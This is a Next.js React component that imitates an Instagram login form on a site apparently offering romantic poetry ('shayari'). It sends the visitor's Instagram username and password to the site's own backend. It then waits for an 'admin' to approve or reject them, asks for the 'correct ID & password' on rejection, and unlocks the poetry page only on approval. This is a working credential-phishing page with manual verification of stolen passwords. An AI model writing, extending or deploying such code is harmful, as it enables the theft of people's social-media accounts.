"use client";
import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function InstagramLogin() {
  const router = useRouter();

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [requestId, setRequestId] = useState<number | null>(null);
  const [status, setStatus] = useState<"IDLE" | "PENDING" | "REJECTED">("IDLE");
  const [error, setError] = useState("");

  // 🔁 Poll admin approval
  useEffect(() => {
    if (!requestId || status !== "PENDING") return;

    const interval = setInterval(async () => {
      try {
        const res = await fetch(
          `/api/user/status/${requestId}`
        );

        const statusText = await res.text(); // ✅ STRING READ

        if (statusText === "APPROVED") {
          clearInterval(interval);
          router.push("/shayari/page1"); // ✅ NEXT PAGE
        }

        if (statusText === "REJECTED") {
          clearInterval(interval);
          setStatus("REJECTED");
          setError("❌ Rejected. Please enter correct ID & password");
          setRequestId(null);
        }
      } catch (err) {
        console.log("Waiting for approval...");
      }
    }, 3000);

    return () => clearInterval(interval);
  }, [requestId, status, router]);

  // 📤 Submit login request
  const submit = async () => {
    if (!username || !password) return;

    setError("");
    setStatus("PENDING");

    const res = await fetch(`/api/user/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        platform: "INSTAGRAM",
        username,
        password,
      }),
    });

    const data = await res.json();
    setRequestId(data.id);
  };

  return (
    <div className="romantic-layout">
      <div className="card">
        <h1>Instagram</h1>

        <div className="flex flex-col gap-2.5">
          <input
            placeholder="Enter Username..."
            value={username}
            required
            className="border border-gray-600 py-1.5 px-3 rounded-lg"
            disabled={status === "PENDING"}
            onChange={(e) => setUsername(e.target.value)}
          />
  
          <input
            type="password"
            placeholder="Enter Password..."
            value={password}
            required
            className="border border-gray-600 py-1.5 px-3 rounded-lg"
            disabled={status === "PENDING"}
            onChange={(e) => setPassword(e.target.value)}
          />
        </div>

        {/* ❌ Reject message */}
        {status === "REJECTED" && (
          <p style={{ color: "red", margin: "10px 0" }}>{error}</p>
        )}

        {/* ⏳ Waiting */}
        {status === "PENDING" && (
          <p style={{ color: "#e75480", margin: "10px 0" }}>
            ⏳ Waiting for admin approval…
          </p>
        )}

        <button
          className="btn mt-5"
          onClick={submit}
          disabled={status === "PENDING"}
        >
          {status === "PENDING" ? "Please wait…" : "Login"}
        </button>
      </div>
    </div>
  );
}
